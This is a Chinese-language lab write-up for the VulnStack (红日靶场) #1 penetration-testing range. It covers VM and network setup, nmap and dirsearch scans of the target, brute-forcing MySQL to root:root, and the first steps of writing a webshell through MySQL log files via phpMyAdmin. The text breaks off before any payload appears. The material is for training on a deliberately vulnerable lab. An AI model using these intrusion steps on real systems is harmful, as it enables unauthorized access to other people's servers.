<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-Independent-Environment/VulnStack/vulnstack-1/index" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.1">
<title data-rh="true">红日靶场 #1 | Target Machines WriteUp</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-1/"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="红日靶场 #1 | Target Machines WriteUp"><meta data-rh="true" name="description" content="1"><meta data-rh="true" property="og:description" content="1"><link data-rh="true" rel="icon" href="/Target-Machines-WriteUp/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-1/"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-1/" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-1/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/Target-Machines-WriteUp/blog/rss.xml" title="Target Machines WriteUp RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/Target-Machines-WriteUp/blog/atom.xml" title="Target Machines WriteUp Atom Feed">



<link rel="preconnect" href="https://static.cloudflareinsights.com">
<script src="https://static.cloudflareinsights.com/beacon.min.js" defer="defer" data-cf-beacon="{&quot;token&quot;:&quot;419208379f5c472a9afad0d3dc0396f9&quot;}"></script><link rel="stylesheet" href="/Target-Machines-WriteUp/assets/css/styles.e4d8af6e.css">
<script src="/Target-Machines-WriteUp/assets/js/runtime~main.d6df8b00.js" defer="defer"></script>
<script src="/Target-Machines-WriteUp/assets/js/main.67e6ef75.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/Target-Machines-WriteUp/"><div class="navbar__logo"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/Target-Machines-WriteUp/img/logo.svg" alt="My Site Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Target Machines WriteUp</b></a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackTheBox/">HackTheBox</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Yunjing/">春秋云境</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/HackMyVM/">HackMyVM</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/Xuanji/">玄机</a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/Target-Machines-WriteUp/docs/category/Redclub">独立靶场</a><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/docs/ToolsGuide/Brute-Forcing/hydra">Tools Guide</a></div><div class="navbar__items navbar__items--right"><a class="navbar__item navbar__link" href="/Target-Machines-WriteUp/blog">Blog</a><a href="https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z"><input placeholder="搜索" aria-label="Search" class="navbar__search-input"><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/Target-Machines-WriteUp/docs/category/Redclub">Redclub - 红日靶场</a><button aria-label="折叠侧边栏分类 &#x27;Redclub - 红日靶场&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-1/">红日靶场 #1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/Target-Machines-WriteUp/docs/Independent-Environment/VulnStack/vulnstack-2/">红日靶场 #2</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/Target-Machines-WriteUp/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/Target-Machines-WriteUp/docs/category/Redclub"><span itemprop="name">Redclub - 红日靶场</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">红日靶场 #1</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><h1>红日靶场 #1</h1>
<div class="theme-admonition theme-admonition-note admonition_xJq3 alert alert--secondary"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z"></path></svg></span>备注</div><div class="admonitionContent_BuS1"><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener noreferrer">ATT&amp;CK 红队评估实战靶场 一</a></p><table><thead><tr><th style="text-align:center">标签</th><th style="text-align:center">信息</th></tr></thead><tbody><tr><td style="text-align:center">作者</td><td style="text-align:center">hongri</td></tr><tr><td style="text-align:center">创建时间</td><td style="text-align:center">2019 年 10 月 20 日 14:05</td></tr><tr><td style="text-align:center">标签</td><td style="text-align:center">内网渗透 , Kill Chain , 域渗透 , 威胁情报</td></tr></tbody></table><p>虚拟机密码</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">hongrisec@2019</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="靶场部署">靶场部署<a href="#靶场部署" class="hash-link" aria-label="靶场部署的直接链接" title="靶场部署的直接链接">​</a></h2>
<p>将压缩包进行解压，应该能够得到</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">D:.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─vulnstack-Win2K3 Metasploitable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─caches</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      └─GuestAppsCache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│          ├─appData</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│          └─launchMenu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">├─vulnstack-win7</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│  └─caches</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│      └─GuestAppsCache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│          ├─appData</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">│          └─launchMenu</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">└─vulnstack-winserver08</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    └─caches</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        └─GuestAppsCache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ├─appData</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            └─launchMenu</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>加载各个文件夹内的 <code>.vmx</code> 文件，即可导入虚拟机</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240312-151233-8cdf356bff2d10a5166b348ea97f81a3.png" width="2560" height="1551" class="img_ev3q"></p>
<p>同时，在网站上看到整体的网络拓扑</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240312-151254-7b797b80d8253621124398ce1dba7d3d.png" width="1123" height="794" class="img_ev3q"></p>
<p>先启动虚拟机，查看各个虚拟机的 ip 地址（Vmware Workstation 的控制台视图下方就有）</p>
<table><thead><tr><th style="text-align:center">Machine</th><th style="text-align:center">IP Address #1</th><th style="text-align:center">IP Address #2</th></tr></thead><tbody><tr><td style="text-align:center">Windows 7 x64</td><td style="text-align:center">192.168.52.143</td><td style="text-align:center">192.168.200.128</td></tr><tr><td style="text-align:center">Windows Server 2008 R2 x64</td><td style="text-align:center">192.168.52.138</td><td style="text-align:center"></td></tr><tr><td style="text-align:center">Win2K3 Metasploitable</td><td style="text-align:center">192.168.52.141</td><td style="text-align:center"></td></tr></tbody></table>
<p>根据信息，创建一个 Host-Only 网卡，ip 地址设置为 <code>192.168.52.0/24</code></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240359-155936-5e092a94e7f49e9e264c62681bb4a213.png" width="899" height="777" class="img_ev3q"></p>
<p>然后除了 <code>Windows 7 x64</code> 加上一块 <code>NAT</code> 模式的网卡，其他虚拟机加的均是 <code>Host-Only</code> 模式的网卡</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240300-180017-1e804a2235539cbd9e1cd15387eff524.png" width="1514" height="1084" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240314-161426-23e1a509a619aa0098b79b1c24141da0.png" width="1514" height="858" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240345-164556-e2717f8e22d953d915a0abe3cd94c1a9.png" width="1510" height="1104" class="img_ev3q"></p>
<p>启动三台虚拟机之后，进入三台虚拟机，均执行一次登陆操作，并触发密码安全规则，修改密码</p>
<div class="theme-admonition theme-admonition-warning admonition_xJq3 alert alert--warning"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 16 16"><path fill-rule="evenodd" d="M8.893 1.5c-.183-.31-.52-.5-.887-.5s-.703.19-.886.5L.138 13.499a.98.98 0 0 0 0 1.001c.193.31.53.501.886.501h13.964c.367 0 .704-.19.877-.5a1.03 1.03 0 0 0 .01-1.002L8.893 1.5zm.133 11.497H6.987v-2.003h2.039v2.003zm0-3.004H6.987V5.987h2.039v4.006z"></path></svg></span>注意</div><div class="admonitionContent_BuS1"><p>建议先对两台 Windows Server 进行以上操作，再对 <code>Windows 7 x64</code> 进行操作，以免触发未知的域配置错误</p></div></div>
<p>最终成功配置
<img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240307-180719-f0b99290e012f46396d6bfaa855ee13a.png" width="2560" height="1551" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240307-180735-e3ac1926116f03ea17e1e06f72708e0f.png" width="2560" height="1551" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240307-180755-1756565bd9ef6d6813fd4b6336f35f63.png" width="2560" height="1551" class="img_ev3q"></p>
<p>最后，在 <code>Windows 7 x64</code> 虚拟机中，打开 <code>C:\phpStudy</code> 目录，启动 phpstudy 环境</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240311-181158-7e15ebc5f3693b7a0a1c723e55cddc80.png" width="2141" height="1372" class="img_ev3q"></p>
<p>环境就配置成功了</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="信息搜集">信息搜集<a href="#信息搜集" class="hash-link" aria-label="信息搜集的直接链接" title="信息搜集的直接链接">​</a></h2>
<p>攻击机由于只能接触到 <code>Windows 7 x64</code> 这台靶机，于是先对这台靶机下手</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">sudo nmap -A --min-rate=5000 -T5 -p- 192.168.200.128</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PORT     STATE SERVICE VERSION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">80/tcp   open  http    Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.4.45)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">|_http-title: phpStudy \xE6\x8E\xA2\xE9\x92\x88 2014</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">135/tcp  open  msrpc   Microsoft Windows RPC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">3306/tcp open  mysql   MySQL (unauthorized)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>尝试访问 web 服务</p>
<p><img decoding="async" loading="lazy" alt="img" src="/Target-Machines-WriteUp/assets/images/image_20240318-181806-c0c181767e967d14c6c1a8dd45346e71.png" width="2560" height="1371" class="img_ev3q"></p>
<p>尝试对其进行目录爆破</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">dirsearch -u 192.168.200.128</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[18:20:57] 200 -   71KB - /phpinfo.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:20:58] 301 -  242B  - /phpMyAdmin  -&gt;  http://192.168.200.128/phpMyAdmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:20:58] 301 -  242B  - /phpmyadmin  -&gt;  http://192.168.200.128/phpmyadmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:20:59] 200 -   32KB - /phpmyadmin/ChangeLog</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:20:59] 200 -    2KB - /phpmyadmin/README</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpMyadmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpMyAdmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpmyAdmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpMyAdmin/index.php</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpmyadmin/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[18:21:00] 200 -    4KB - /phpmyadmin/index.php</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>同时发现存在 3306 - mysql 服务，以及探针上存在 mysql 连接测试功能，尝试进行爆破，得到弱凭据</p>
<div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">root:root</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="webshell-部署">webshell 部署<a href="#webshell-部署" class="hash-link" aria-label="webshell 部署的直接链接" title="webshell 部署的直接链接">​</a></h2>
<p>将 <code>mysql</code>+<code>phpmyadmin</code> 相结合，很容易就能联想到 mysql 日志文件写 webshell</p>
<p>参考 <a href="https://blog.csdn.net/weixin_54813510/article/details/130859673" target="_blank" rel="noopener noreferrer">sql 注入和 phpmyadmin 日志写入 webshell_从数据库中进行写 webshell 的前置条件为 - CSDN 博客</a></p>
<p>首先，先对环境进行探测</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">show</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">global</span><span class="token plain"> variables </span><span class="token operator" style="color:#393A34">like</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;%secure%&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Variable_name  </span><span class="token keyword" style="color:#00009f">Value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">secure_auth  </span><span class="token keyword" style="color:#00009f">OFF</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">secure_file_priv  </span><span class="token boolean" style="color:#36acaa">NULL</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里没有办法直接写文件，所以指定日志文件的路径</p>
